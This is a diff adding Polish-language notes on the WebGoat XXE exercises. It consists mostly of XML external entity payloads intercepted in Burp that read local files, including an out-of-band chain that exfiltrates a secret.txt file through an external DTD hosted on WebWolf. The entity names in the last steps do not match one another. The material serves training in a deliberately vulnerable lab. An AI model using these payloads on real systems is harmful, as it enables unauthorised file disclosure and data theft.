@@ -1,0 +1,35 @@
+4. Przechwytujemy w Burpie po dodaniu jakiegokolwiek komentarza i edytujemy nasze zapytanie:
+
+<?xml version="1.0"?> <!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]> 
+<comment>  <text>&root;</text></comment>
+
+7. Podobna sytuacja, innaczej zmodyfikowany tekst i zmiana typu kontentu na xml:
+
+Content-Type: application/xml
+
+
+<?xml version="1.0"?>
+ <!DOCTYPE another [
+<!ENTITY fs SYSTEM "file:///"> 
+]> 
+<comment>  <text>
+grzdun&fs;
+</text></comment>
+
+11. Tworzymy plik do ataku i przesyłamy do WebWolfa:
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % payload  "<!ENTITY attack SYSTEM 'http://localhost:9090/landing?text=%file;'>">
+
+
+Modyfikujemy zapytanie przechwycone w Burpie
+<?xml version="1.0"?>
+<!DOCTYPE root [
+    <!ENTITY % file SYSTEM "file:///c:/Users/cuqier/.webgoat-8.1.0/XXE/secret.txt">
+    <!ENTITY % getdtd SYSTEM "http://localhost:9090/files/webgoat/zap.dtd">
+    %getdtd;
+    %write;
+]>
+<comment>  <text>1&send;</text></comment>
+
+Sprawdzamy dodawanie komentarzy: &test;
+Następnie sprawdzamy Incoming requests w WebWolfie (WebGoat 8.0 rocks... (jCVeiaUCjc)), kopiujemy i edytujemy wiadomość.
